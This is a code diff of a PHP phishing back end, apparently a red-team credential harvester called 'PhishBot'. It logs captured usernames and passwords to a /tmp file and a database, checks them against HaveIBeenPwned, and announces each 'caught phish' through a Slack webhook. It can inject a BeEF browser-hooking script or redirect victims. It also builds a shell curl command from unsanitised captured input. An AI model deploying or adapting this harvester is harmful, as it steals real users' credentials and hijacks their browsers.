@@ -1,16 +1,14 @@
 <?php
 
 // Set Slack Webhook URL
-$slackurl = "https://hooks.slack.com/services/TOKEN_GOES_HERE";
-$slackchannel = "#SLACK_CHANNEL";
-$slackemoji = ":see_no_evil:";
+$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_HERE";
+$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
+$slackemoji = ":fishing_pole_and_fish:";
 $slackbotname = "PhishBot";
 
-// Set Optional BEEF Hook URL (http://YOUR-IP-HERE:3000/hook.js)
+// Set Optional BEEF Hook URL
+//$BEEFUrl = "https://YOUR_URL:3000/hook.js";
 $BEEFUrl = "";
-
-// Your API URL Here (https://This web site)
-$APIURI = "https://YOUR_API_HERE";
 
 // Receives Required Parameters and Sets Variables
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -41,7 +39,7 @@ if ($conn->connect_error) {
 if($user != ""){
 
 // Writes User and Password to a Local Log (In Case DB Insert Fails)
-$myfile = fopen("/tmp/PhishingAPILogs.txt", "a") or die("Unable to open file!");
+$myfile = fopen("/tmp/APIPhishingLogs.txt", "a") or die("Unable to open file!");
 $txt = $user." ".$pass."\n\r\n\r";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
@@ -64,12 +62,25 @@ body {
     margin: 0;
 }
 </style>
+
+<?php
+if($redirect != "" && $BEEFUrl == ""){
+?>
+
+<meta http-equiv="refresh" content="0;URL='<?php echo $redirect; ?>'" />
+
+<?php } ?>
 </HEAD>
 <BODY>
 
+<?php if($redirect == ""){?>
+
+<h1>It Works!</h1>
+
+<?php } ?>
+
 <?php
-// Launches Redirect Location in iFRAME for Persistent BeEF Hooking.  For Best Results Use a Clickjacking Vulnerable Redirect Variable
-if($redirect != ""){
+if($redirect != "" && $BEEFUrl != ""){
 ?>
 
 <iframe src="<?php echo $redirect; ?>" style="border: 0; width: 100%; height: 100%"></iframe>
@@ -77,7 +88,7 @@ if($redirect != ""){
 <?php
 }
 // Performs BEEF Hook if Set
-if($BEEFUrl != ""){?>
+if($BEEFUrl != "" && $redirect != ""){?>
 <script src= "<?php echo $BEEFUrl; ?>" type="text/javascript"></script>
 <?php } ?>
 </BODY>
@@ -86,8 +97,7 @@ if($BEEFUrl != ""){?>
 
 <?php
 
-// Compose URL for Slack Message to Take Directly to Results
-$slacklink = $APIURI."/results/index.php?project=".$portal;
+$slacklink = "https://authportals.com/results/index.php?project=".$portal;
 
 // Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
 if($user != ""){
@@ -99,9 +109,9 @@ if($pass != ""){
 if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", $pass)){
     $passstrength = ":thumbsup:";
 } else {
-    $passstrength = ":thumbsdown:";
+    $passstrength = ":poop:";
 }
-    
+
 //Checks HaveIBeenPwned DB
 $sha1pass = strtoupper(sha1($pass));
 
@@ -127,26 +137,16 @@ if (in_array(substr($sha1pass, 5), $pwnedarray)) {
 } else $TroyHunt = "no";
 
 // If the Password is Set, Change Slack Message
-$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;
+$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;
 
 } else {
 
 // If the Password is Not Set, Do Not Include Password Strength in Slack Message
-$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";
+$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";
 
 }
 
 if($TroyHunt == "yes"){$message = $message."\r\n*_HaveIBeenPwned Hit_*";}
-
-// If the Password is Set, Change Slack Message
-$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;
-
-} else {
-
-// If the Password is Not Set, Do Not Include Password Strength in Slack Message
-$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";
-
-}
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
